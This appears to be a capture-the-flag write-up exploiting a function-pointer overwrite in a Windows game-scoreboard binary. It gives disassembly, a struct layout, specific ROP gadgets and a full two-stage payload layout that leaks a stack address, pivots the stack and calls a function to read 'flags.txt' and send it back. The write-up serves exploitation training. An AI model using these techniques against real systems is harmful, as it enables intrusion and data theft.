in showtop function:
...
.text:00412077                 mov     eax, [ebp+ga]  ---> eax points to game1
.text:0041207A                 push    eax
.text:0041207B                 mov     ecx, [ebp+ga]   ---> ecx points to game1
.text:0041207E                 mov     edx, [ecx+10h]  ---> call game1->getBA
.text:00412081                 call    edx
...

struct Game
{
	DWORD id; //offset 0x0
	DWORD score; //offset 0x4
	ByteArray name;
    //	int strlen;  //offset 0x8
	//	char *buf;  //offset 0xc
	GETBA getBA; //offset 0x10
	Game *next; //offset 0x14
};

according to vulnerability, we can overwrite function pointer "getBA" to call rop, we need overwrite 2 times for 2 times ROP call:
1. first time, detect stack address.
when "getBA" is called, edi is stack address, eax is Game struct, so we could use below rop to save edi to Game struct
rop1: or  [eax+0x00000001], edi ; ret  ;
then we could read Game data from response to know stack address.

2. second time, call testfunc to read flag content and send back.
we should set stack first, we use:
rop2: xchg eax, ebp ; mov eax, 0x00000001 ; mov esp, ebp ; pop ebp ; ret   //eax->esp
rop3: mov esp, ebp ; pop ebp ; ret  ; //ebp->esp
rop4: pop ebp ; ret  ;

then we need to trigger exception in testfunc to call fopen/fread, so we need to overwrite player pointer variable.
we could use below rop to write any address according to ebx and esi.
rop5: mov [ebx], esi ; pop edi ; pop ebx ; pop esi ; pop ebp ; retn 0x0004 ; 
rop6: pop ebx ; pop esi ; pop ebp ; retn 0x0004 ; 

to sum up, finally we could set top1GAME(eax) to payload1:
0x0:0
0x4:rop4
0x8:0
0xc:rop4
0x10:rop2, change esp to payload1+0x0;
0x14:rop4
0x18:stackaddr-4 //ebp
0x1c:memcpy
0x20:rop3, set esp to stackaddr-4(ebp)
0x24:stackaddr //dst
0x28:payload2 //src
0x2c:0x100 //size

payload2 could be payload1+0xa00
0x0:rop6, set ebx and esi 
0x4:player pointer address //ebx
0x8:0 //esi
0xc:0 //ebp
0x10:rop5, set player pointer to 0
0x14:0 //for retn 0x0004 ; 
0x18:0 //edi
0x1c:0 //ebx
0x20:0 //esi
0x24:0 //ebp
0x28:testfunc 
0x2c:0 //for retn 0x0004 ; 
0x30:rop6, adjust stack
0x34:payload2+0x54, "flags.txt"
0x38:payload2+0x64, buf for flag content 
0x3c:size, 0x30
0x40:senddata
0x44:0 //for retn 0x0004 ; 
0x48:_exit
0x4c:payload2+0x64, buf for flag content
0x50:size, 0x30
0x54:"flags.txt"
...
0x64:flag content

